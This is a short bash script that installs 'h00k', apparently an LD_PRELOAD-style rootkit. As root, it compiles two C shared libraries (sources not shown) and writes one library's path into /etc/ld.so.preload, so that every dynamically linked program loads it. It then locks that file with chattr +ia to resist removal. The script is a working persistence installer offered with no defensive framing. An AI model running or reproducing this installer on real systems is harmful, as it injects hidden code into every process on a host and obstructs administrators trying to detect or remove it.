#!/bin/bash
clear

echo ""
echo "Setting up h00k..."
echo ""

if [ $(id -u) != 0 ]; then
    echo ""
    echo "Please run this as root! Exiting..."
    echo ""
    exit
fi

cd /home/landy/Projects/misc/h00k

type="-std=gnu99"
flags="-O0 -Wall -fomit-frame-pointer -fPIC -shared -ldl -Wl,--build-id=none -o"
dir="/home/landy/Projects/misc/h00k"

gcc $type h00kExec.c $flags h00kExec.so
gcc $type h00k.c $flags h00k.so

echo $dir/h00k.so > /etc/ld.so.preload
chattr +ia /etc/ld.so.preload

echo ""
echo "Done!"



